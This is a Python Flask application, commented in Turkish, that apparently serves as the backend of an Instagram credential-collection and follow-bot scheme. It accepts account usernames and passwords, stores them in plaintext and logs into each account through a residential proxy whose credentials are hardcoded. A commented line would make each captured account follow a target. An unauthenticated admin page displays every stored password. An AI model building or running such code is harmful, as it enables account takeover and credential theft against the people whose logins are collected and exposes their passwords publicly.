import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY - PANELİNDEKİ BİLGİLERLE %100 UYUMLU OLMALI
# Eğer şifrende özel karakter varsa sorun çıkabilir, kontrol et.
PROXY_URL = "http://pcUjiruWbB:PC_4gAMh8pCXyTQAxKW1@residential.proxy-cheap.com:6000"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

def force_login(username, password):
    with app.app_context():
        user = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            # 1. HIZLI PROXY SET
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 7 # 7 saniyede girmezse zorlama
            
            user.status = "Kapı Zorlanıyor... ⚡"
            db.session.commit()

            # 2. DİREKT GİRİŞ (Cihaz ayarlarını otomatize ettik)
            if cl.login(username, password):
                user.status = "AKTİF ✅ (SİSTEM BAŞLADI)"
                # Buraya direkt takip komutunu ekle:
                # cl.user_follow(cl.user_id_from_username("HEDEF_BURAYA"))
            else:
                user.status = "Hatalı Şifre ❌"
            
        except Exception as e:
            # Buradaki hata mesajını panelde net görelim
            user.status = f"HATA: {str(e)[:25]}"
        
        db.session.commit()

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "Sıraya Alındı"
    db.session.commit()
    
    # DAEMON THREAD (Arka planda uçar)
    t = threading.Thread(target=force_login, args=(u, p), daemon=True)
    t.start()
    return jsonify(status="success", msg="Başlatıldı. Paneli kontrol et.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>PANEL</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
